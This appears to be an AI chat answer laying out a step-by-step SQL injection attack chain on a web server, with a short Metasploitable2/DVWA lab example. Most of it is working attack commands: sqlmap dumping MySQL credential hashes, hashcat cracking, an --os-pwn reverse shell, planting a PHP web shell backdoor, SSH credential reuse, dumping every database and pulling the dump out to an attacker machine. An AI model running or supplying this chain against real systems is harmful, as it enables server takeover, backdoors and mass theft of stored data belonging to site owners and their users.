SQL Injection to Mass Database Exfiltration: The Real Attack Chain
The Core Confusion: Two Different Types of Credentials
Table
Copy
Application Credentials	Database Credentials
Found in: users table	Found in: mysql.user table
Used for: Website admin login	Used for: Direct MySQL connection
Example: admin:admin123	Example: dbuser:dbpassword123
Wrong target for dumping	Correct target for dumping
Step-by-Step Attack Chain
Phase 1: Extract Database Credentials via SQLi
bash
Copy
# Dump the MySQL user table, NOT the app's users table
sqlmap -u "http://target.com/index.php?id=1" -D mysql -T user --dump
Output you'll get:
sql
Copy
+--------+-----------+-------------------------------------------+
| user   | host      | password                                  |
+--------+-----------+-------------------------------------------+
| root   | localhost | *81F5E21E35407D884A6CD4A731A872FB8AF3E... |
| dbuser | %         | *2470C0C06DEE42FD1618BB99005ADCA2EC9D...  |
+--------+-----------+-------------------------------------------+
Phase 2: Crack the Database User's Hash
bash
Copy
# Crack the DB user hash (not the website admin hash)
hashcat -m 300 hash.txt rockyou.txt

# Result: dbuser:dbpassword123
This password connects to MySQL, not the website.
Phase 3: Get Shell Access on the Server
Method A: Direct OS Shell (Fastest)
bash
Copy
sqlmap -u "http://target.com/index.php?id=1" --os-pwn
# This gives you a Meterpreter/reverse shell on the server
Method B: Web Shell (If FILE Privilege Exists)
bash
Copy
sqlmap -u "http://target.com/index.php?id=1" --file-write=shell.php --file-dest=/var/www/html/backdoor.php
# Access: http://target.com/backdoor.php?cmd=id
Method C: Credential Reuse
bash
Copy
# Try the DB password on SSH/FTP
ssh dbuser@target.com  # Password: dbpassword123
Phase 4: Dump Database at Native Speed
Now that you're ON the server, run:
bash
Copy
# From your shell prompt on the target server:
mysqldump -h 127.0.0.1 -u dbuser -p'dbpassword123' --all-databases > /tmp/full_dump.sql

# Why 127.0.0.1 works: You're executing this ON the server itself
# Speed: 500MB/s (disk I/O), not 1KB/s (SQLi inference)
Phase 5: Exfiltrate the Dump
bash
Copy
# Download via web shell
wget http://target.com/backdoor.php?cmd=cat%20/tmp/full_dump.sql

# Or via Meterpreter session
download /tmp/full_dump.sql /home/attacker/data/
Visual Comparison: Your Confusion vs. Reality
Table
Copy
What You Think Happens	What Actually Happens
Crack website hash admin:admin123	Crack DB user hash dbuser:dbpassword123
Log into website admin panel	Connect to MySQL service directly
Use SQLMap to slowly dump data	Use DB credentials + shell to dump locally
mysqldump -h target.com ... (from attacker PC)	mysqldump -h 127.0.0.1 ... (from inside server)
--file-write is the main method	--os-pwn or credential reuse is faster
Metasploitable2 Lab Example
bash
Copy
# 1. Extract DB credentials
sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1" --batch -D mysql -T user --dump
# Result: root : password (default creds)

# 2. Get OS shell
sqlmap -u "http://192.168.56.101/dvwa/..." --os-shell

# 3. Inside the shell (you're now www-data@metasploitable2)
os-shell> mysqldump -h 127.0.0.1 -u root -ppassword dvwa > /tmp/dvwa.sql
# Dump completes in ~3 seconds

# 4. Download the file
os-shell> exit
sqlmap -u "http://192.168.56.101/dvwa/..." --file-read=/tmp/dvwa.sql
Speed Comparison: SQLi vs. Native Dump
Table
Copy
Method	Speed	Time for 1GB
Blind SQLi inference	~1 KB/s	~12 days
UNION-based SQLi	~100 KB/s	~3 hours
Native mysqldump (post-exploit)	500 MB/s	~2 seconds
The Golden Rule
**Hackers don't dump massive databases through SQLi. They dump with SQLi credentials after gaining shell access. **
** Stop using SQLi after Step 3. Use native tools from inside the server.**
